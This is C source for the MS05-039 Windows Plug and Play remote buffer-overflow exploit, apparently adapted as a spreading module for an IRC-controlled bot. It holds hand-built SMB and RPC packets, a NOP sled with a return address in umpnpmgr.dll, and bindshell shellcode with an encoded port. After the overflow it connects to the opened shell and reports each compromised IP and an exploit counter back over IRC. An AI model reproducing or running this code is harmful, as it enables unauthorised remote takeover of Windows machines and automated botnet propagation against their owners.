/* 
  HOD-ms05039-pnp-expl.c: 2005-08-10: PUBLIC v.0.2
					   <3 DFNC
 */

 /* #define _WIN32 */

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_PNP

unsigned char SMB_Negotiate[] =
	"\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F"
	"\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02"
	"\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F"
	"\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70"
	"\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
	"\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54"
	"\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00";


unsigned char SMB_SessionSetupAndX[] =
	"\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00"
	"\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E"
	"\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00"
	"\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
	"\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00"
	"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
	"\x2E\x00\x30\x00\x00\x00\x00\x00";


unsigned char SMB_SessionSetupAndX2[] =
	"\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00"
	"\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E"
	"\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46"
	"\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40"
	"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40"
	"\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48"
	"\x00\x4F\x00\x44\x00\x00\xED\x41\x2C\x27\x86\x26\xD2\x59\xA0\xB3"
	"\x5E\xAA\x00\x88\x6F\xC5\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00"
	"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"
	"\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00"
	"\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00"
	"\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00";


unsigned char SMB_TreeConnectAndX[] =
	"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";



unsigned char SMB_TreeConnectAndX_[] =
	"\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";


/* browser */
unsigned char SMB_PipeRequest_browser[] =
	"\x00\x00\x00\x66\xFF\x53\x4D\x42\xA2\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x78\x04"
	"\x00\x08\x40\x00\x18\xFF\x00\xDE\xDE\x00\x10\x00\x16\x00\x00\x00"
	"\x00\x00\x00\x00\x9F\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00"
	"\x02\x00\x00\x00\x03\x13\x00\x00\x5C\x00\x62\x00\x72\x00\x6F\x00"
	"\x77\x00\x73\x00\x65\x00\x72\x00\x00\x00";


unsigned char SMB_PNPEndpoint[] =
/* 8d9f4e40-a03d-11ce-8f69-08003e30051b v1.0: pnp */
	"\x00\x00\x00\x9C\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x78\x04"
	"\x00\x08\x50\x00\x10\x00\x00\x48\x00\x00\x00\x00\x10\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x48\x00\x54\x00\x02"
	"\x00\x26\x00\x00\x40\x59\x00\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
	"\x45\x00\x5C\x00\x00\x00\x40\x00\x05\x00\x0B\x03\x10\x00\x00\x00"
	"\x48\x00\x00\x00\x01\x00\x00\x00\xB8\x10\xB8\x10\x00\x00\x00\x00"
	"\x01\x00\x00\x00\x00\x00\x01\x00\x40\x4E\x9F\x8D\x3D\xA0\xCE\x11"
	"\x8F\x69\x08\x00\x3E\x30\x05\x1B\x01\x00\x00\x00\x04\x5D\x88\x8A"
	"\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00";



unsigned char RPC_call[] =
	"\x00\x00\x08\x90\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x78\x04"
	"\x00\x08\x60\x00\x10\x00\x00\x3C\x08\x00\x00\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x3C\x08\x54\x00\x02"
	"\x00\x26\x00\x00\x40\x4D\x08\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
	"\x45\x00\x5C\x00\x00\x00\x40\x00\x05\x00\x00\x03\x10\x00\x00\x00"
	"\x3C\x08\x00\x00\x01\x00\x00\x00\x24\x08\x00\x00\x00\x00\x36\x00"
	"\x11\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x52\x00\x4F\x00"
	"\x4F\x00\x54\x00\x5C\x00\x53\x00\x59\x00\x53\x00\x54\x00\x45\x00"
	"\x4D\x00\x5C\x00\x30\x00\x30\x00\x30\x00\x30\x00\x00\x00\x00\x00"
	"\xFF\xFF\x00\x00\xE0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\xC0\x07\x00\x00\x00\x00\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"

	/* jmp over - entry point */
	"\xEB\x08\x90\x90"

	/* pop reg; pop reg; retn; - umpnpmgr.dll */
	"\x67\x15\x7a\x76" /* 0x767a1567 */

	/* jmp ebx - umpnpmgr.dll
	"\x6f\x36\x7a\x76" */

	"\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\x90\x90\x90\x90\x90\x90\x90\xEB\x08\x90\x90\x48\x4F\x44\x88\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";


unsigned char RPC_call_end[] =
	"\xE0\x07\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00";

void
convert_name(char *out, char *name)
{
	unsigned long len;

	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}



BOOL PNP(char *target, void* conn,EXINFO exinfo)
{
	IRC* irc=(IRC*)conn;
	SOCKADDR_IN addr;
//	struct hostent *he;
	int len;
	int sockfd;
	unsigned short smblen;
//	unsigned short bindport;
//	unsigned char tmp[1024];
	char tmp[1024];
	unsigned char packet[4096];
	unsigned char *ptr;
	char recvbuf[4096];
//	BOOL success=FALSE;
	char* thisTarget;
	int pnpbindsize=405;

	WSADATA wsa;
	fWSAStartup(MAKEWORD(2,0), &wsa);

//	irc->privmsg(target,"%s %s: Checking socket... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
	if ((sockfd = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) return FALSE;

	thisTarget = exinfo.ip;

//	irc->privmsg(target,"%s %s: Prior hostent assign... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
/*	addr.sin_family = AF_INET;
	addr.sin_port = fhtons(445);
	addr.sin_addr = *((struct in_addr *)he->h_addr);
	memset(&(addr.sin_zero), '\0', 8);*/
//	SOCKADDR_IN their_addr;
	ZeroMemory(&addr,sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = finet_addr(thisTarget);
	addr.sin_port = fhtons((unsigned short)exinfo.port);
//	irc->privmsg(target,"%s %s: Post hostent assign... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

//	irc->privmsg(target,"%s %s: Connecting... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
	if (fconnect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) return FALSE;
//	irc->privmsg(target,"%s %s: Connected to IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
	if (fsend(sockfd, (const char *)SMB_Negotiate, sizeof(SMB_Negotiate)-1, 0) < 0) return FALSE;
//	irc->privmsg(target,"%s %s: Negotiating... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

	len = frecv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) return FALSE;
//	irc->privmsg(target,"%s %s: Building Buffer... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
	
	if (fsend(sockfd, (const char *)SMB_SessionSetupAndX, sizeof(SMB_SessionSetupAndX)-1, 0) < 0) return FALSE;
//	irc->privmsg(target,"%s %s: Creating Session... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
	
	len = frecv(sockfd, recvbuf, 4096, 0);
	if (len <= 10) return FALSE;
//	irc->privmsg(target,"%s %s: Building Buffer Pt 2... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

	if (fsend(sockfd, (const char *)SMB_SessionSetupAndX2, sizeof(SMB_SessionSetupAndX2)-1, 0) < 0) return FALSE;
//	irc->privmsg(target,"%s %s: Creating Session Pt 2... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
	
	len = frecv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) return FALSE;
//	irc->privmsg(target,"%s %s: Building Buffer Pt 3... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

//	irc->privmsg(target,"%s %s: Pre malicious packet creation... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);	
	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX)-1);
	ptr += sizeof(SMB_TreeConnectAndX)-1;

	//_snprintf(tmp,sizeof(tmp), "\\\\%s\\IPC$", thisTarget);
	sprintf(tmp,"\\\\%s\\IPC$",thisTarget);
	convert_name((char *)ptr, tmp);
	smblen = strlen(tmp)*2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX)-1-3, &smblen, 1);
//	irc->privmsg(target,"%s %s: Mid malicious packet creation... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);	

	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_)-1);
	ptr += sizeof(SMB_TreeConnectAndX_)-1;

	smblen = ptr-packet;
	smblen -= 4;
	memcpy(packet+3, &smblen, 1);
//	irc->privmsg(target,"%s %s: Post malicious packet creation... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);	

	if (fsend(sockfd, (char *)packet, ptr-packet, 0) < 0) return FALSE;
//	irc->privmsg(target,"%s %s: Sending malicious packet... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

	len = frecv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) return FALSE;
//	irc->privmsg(target,"%s %s: More buffering... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

	if (fsend(sockfd, (char *)SMB_PipeRequest_browser, sizeof(SMB_PipeRequest_browser)-1, 0) < 0) return FALSE;
//	irc->privmsg(target,"%s %s: Requesting... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

	len = frecv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) return FALSE;
//	irc->privmsg(target,"%s %s: More buffering... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

	if (fsend(sockfd, (char *)SMB_PNPEndpoint, sizeof(SMB_PNPEndpoint)-1, 0) < 0) return FALSE;
//	irc->privmsg(target,"%s %s: Exploiting... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

	len = frecv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) return FALSE;
//	irc->privmsg(target,"%s %s: Buffering... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

	// nop
	ptr = packet;
	memset(packet, '\x90', sizeof(packet));

	// header & offsets
	memcpy(ptr, RPC_call, sizeof(RPC_call)-1);
	ptr += sizeof(RPC_call)-1;

	// shellcode
	unsigned short port;
    port = fhtons(bindport)^(USHORT)0x9999;
    memcpy(&bindshell[176],&port,2);
	memcpy(ptr,bindshell,pnpbindsize-1);

	// end of packet
	memcpy( packet + 2196 - sizeof(RPC_call_end)-1 + 2,
		RPC_call_end,
		sizeof(RPC_call_end)-1);

	// sending...
	if (fsend(sockfd, (char *)packet, 2196, 0) < 0) return FALSE;
//	irc->privmsg(target,"%s %s: GotEM... (%s).", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
	frecv(sockfd, recvbuf, 4096, 0);

	Sleep(5000);
 	if (ConnectShell(exinfo,bindport))
 	{
 		irc->privmsg(target,"%s %s: Exploiting IP: %s.", scan_title, "pnp", exinfo.ip);
		exploit[exinfo.exploit].stats++;
 	}
		fclosesocket(sockfd);
        return TRUE;

}
#endif;

// milw0rm.com [2005-08-12] 